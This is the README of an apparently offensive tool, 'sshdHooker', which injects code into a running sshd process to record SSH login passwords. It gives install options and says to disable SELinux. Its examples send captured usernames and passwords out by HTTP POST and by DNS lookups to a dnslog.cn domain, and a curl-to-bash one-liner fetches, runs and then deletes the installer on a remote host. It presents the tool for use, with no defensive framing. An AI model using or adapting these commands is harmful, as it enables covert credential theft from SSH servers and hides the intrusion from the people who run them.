# what's this?

注入SSHD之后就能记录下密码或者做其他操作。

需要关闭selinux

# how to use

## auto installer
密码记录器一键安装，仅暂时支持x64

直接执行命令
```
bash install.sh
```

直接运行后ssh密码登录，记录地址为/tmp/.password.txt，默认so地址为/tmp/hello.so，默认注入器名字为/tmp/.i


其他参数：
```
    -e   修改so文件的路径，默认/tmp/hello.so
    -o   修改注入器的路径，默认/tmp/.i.
    -m   修改mode默认值为0，输出到文件，默认记录地址为/tmp/.password.txt ，如果值为1，则会改为命令行模式
    -p   修改payload，默认值为/tmp/.password.txt，如果mode值为1，则会使用snsprintf来格式化命令并且输出，请确保字符串中包含两个%s，用于格式化用户名和密码
    -d   自动删除，设置为anyone则抓到密码后立刻删除，否则则抓取到设置的指定用户名后删除
    -l   指定libc路径，默认寻址是寻找libc-xxxx.so和libc.so.x的方案，但是不排除会有其他奇奇怪怪的libc名称，所以添加了手动指定功能，详情可以查看/proc/pid/maps里找到libc名字
```
## 例子

https发送密码
```
bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
```

dns发送密码并且自动删除
```
bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d anyone
```

远程快速自动部署并自动删除
```
curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.1/sshdHooker.sh | bash -s -- -d anyone
```

## debug

执行
```
gcc -shared inject_got.c -ldl -fPIC -o test2.so -std=c99

mv test2.so /tmp/hello.so

gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread

sudo ./inject sshd_pid
```

然后等待用户连接SSH并且登录成功，密码保存于/tmp/.password.txt

# todo

 - 增加x86/arm支持
 - bypass SELINUX